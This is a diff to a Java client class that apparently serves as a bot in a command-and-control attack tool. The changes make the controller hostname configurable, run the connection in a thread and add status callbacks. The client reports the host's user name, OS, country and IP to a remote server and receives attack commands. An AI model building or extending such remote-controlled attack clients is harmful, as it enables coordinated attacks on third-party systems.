@@ -26,30 +26,21 @@ public class Client implements AttackCallback {
     private InetAddress mIpAddress;
     private String mOperationSystemName;
 
+    public ClientCallback mCallback;
+
     private Socket mSocket;
     private ObjectInputStream input;
 
-//    public static void main(String[] args) throws IOException {
-//
-//        Client app = new Client(
-//                "localhost",
-//                8094,
-//                System.getProperty("user.name"),
-//                System.getProperty("os.name"),
-//                System.getProperty("user.country"),
-//                InetAddress.getLocalHost());
-//        app.connect();
-//    }
-
-    public static Client startClient() throws UnknownHostException {
+    public static Client startClient(String hostname, ClientCallback callback) throws UnknownHostException {
         Client newClientapp = new Client(
-                "localhost",
+                hostname,
                 8094,
                 System.getProperty("user.name"),
                 System.getProperty("os.name"),
                 System.getProperty("user.country"),
                 InetAddress.getLocalHost());
-        newClientapp.connect();
+        newClientapp.mCallback = callback;
+        new Thread(newClientapp::connect).start();
         return newClientapp;
     }
 
@@ -76,6 +67,7 @@ public class Client implements AttackCallback {
         } while (mSocket == null);
 
         System.out.println("Connection accepted " + mSocket.getInetAddress() + ":" + mSocket.getPort());
+        mCallback.onConnected();
 
         try {
             sendClientData();
@@ -89,6 +81,7 @@ public class Client implements AttackCallback {
 
                 if (message != null) {
 
+                    mCallback.onCommandReceived(message.toString());
                     boolean commandExecuted = false;
 
                     switch (message.getAttackType()) {
@@ -121,6 +114,7 @@ public class Client implements AttackCallback {
                 }
             }
         } catch (IOException | ClassNotFoundException e) {
+            mCallback.onDisconnect();
             System.out.println("Connection lost");
             e.printStackTrace();
             mSocket = null;
@@ -186,11 +180,18 @@ public class Client implements AttackCallback {
 
     @Override
     public void onStarted() {
+        mCallback.onAttackStarted();
         sendStatusUpdate(ClientStatusEnum.ATTACKING);
     }
 
     @Override
     public void onFinish() {
+        mCallback.onAttackStopped();
         sendStatusUpdate(ClientStatusEnum.STAND_BY);
+    }
+
+    @Override
+    public void attackStatus(String name) {
+        mCallback.onCommandReceived(name);
     }
 }
